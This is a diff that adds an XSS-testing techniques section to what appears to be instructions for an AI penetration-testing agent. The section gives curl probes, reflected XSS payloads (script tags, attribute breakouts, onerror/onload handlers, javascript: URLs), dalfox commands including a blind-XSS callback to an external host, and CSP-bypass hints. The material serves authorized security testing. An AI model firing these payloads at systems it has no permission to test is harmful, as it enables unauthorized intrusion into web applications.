@@ -53,6 +53,37 @@ EVIDENCE RULE: A scanner hit (dalfox alert, nuclei match) is a LEAD, not a confi
 A vulnerability is CONFIRMED only when you verify the payload actually executes (step 5).
 If you cannot confirm execution, report the lead as UNCONFIRMED.
 
+## PRACTICAL TECHNIQUES
+
+### Finding Reflection Points
+1. `curl 'http://target/search?q=CANARY12345' | grep CANARY12345` — find where input is reflected in the response
+2. `curl -s 'http://target/search?q=CANARY12345' | grep -c CANARY12345` — count reflection points
+3. Check the HTML context around the reflection: is it inside an HTML tag body, an attribute value, a JavaScript block, or a URL?
+4. Try multiple input points: search boxes, URL path segments, URL hash fragments, API parameters, user profile fields
+
+### Context-Aware XSS Testing
+1. **HTML body context**: `curl 'http://target/search?q=<script>alert(1)</script>'` — check if tags are reflected unencoded
+2. **Attribute context**: `curl 'http://target/search?q=" onmouseover=alert(1) x="'` — break out of attribute
+3. **JavaScript context**: `curl 'http://target/search?q='-alert(1)-''` — break out of JS string
+4. **URL context**: `curl 'http://target/redirect?url=javascript:alert(1)'` — JavaScript protocol in URL
+5. If basic payloads are filtered, try encoding: `%3Cscript%3E`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`
+
+### Automated Scanning
+1. `dalfox url 'http://target/search?q=test' --skip-bav` — automated reflected XSS scanning
+2. `dalfox url 'http://target/search?q=test' --blind https://your-callback.xss.ht` — blind XSS detection
+3. For multiple URLs: save URLs to a file and use `dalfox file urls.txt`
+
+### DOM XSS Detection
+1. `curl -s http://target/main.js | grep -E '(innerHTML|document\.write|eval\(|location\.(hash|search))'` — find dangerous sinks in JavaScript
+2. `curl -s http://target/ | grep -oE 'src="[^"]*\.js"' | sort -u` — list all JS files to review
+3. Check for DOM XSS patterns: `document.location`, `window.name`, `document.referrer` flowing into `innerHTML`, `eval`, `document.write`
+
+### Evidence Requirements
+- Show the exact URL or curl command that triggers the XSS
+- Show the response body proving the payload is reflected unencoded in an executable context
+- A reflection is NOT XSS unless the payload is unencoded in an executable context (inside `<script>`, event handler, or unquoted attribute)
+- If Content-Security-Policy blocks execution, note the CSP header value and check for bypasses (unsafe-inline, base-uri missing, etc.)
+
 ## OPERATIONAL ENVIRONMENT
 
 <container_constraints>
